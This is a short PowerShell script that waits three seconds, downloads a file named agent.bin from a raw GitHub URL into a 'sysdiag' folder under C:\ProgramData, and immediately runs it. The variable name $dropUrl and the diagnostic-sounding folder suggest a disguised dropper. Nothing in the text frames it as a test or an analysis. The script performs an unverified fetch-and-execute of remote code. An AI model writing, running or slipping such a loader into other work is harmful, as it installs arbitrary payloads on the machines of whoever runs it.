Start-Sleep 3
$dropUrl = "https://raw.githubusercontent.com/flocktrag/sysdiag-utils/main/agent.bin"
$destPath = "C:\ProgramData\sysdiag\agent.bin"

# Ensure the sysdiag directory exists
$folder = Split-Path $destPath
if (-not (Test-Path $folder)) {
    New-Item -Path $folder -ItemType Directory | Out-Null
}

Invoke-WebRequest -Uri $dropUrl -OutFile $destPath
Start-Process $destPath
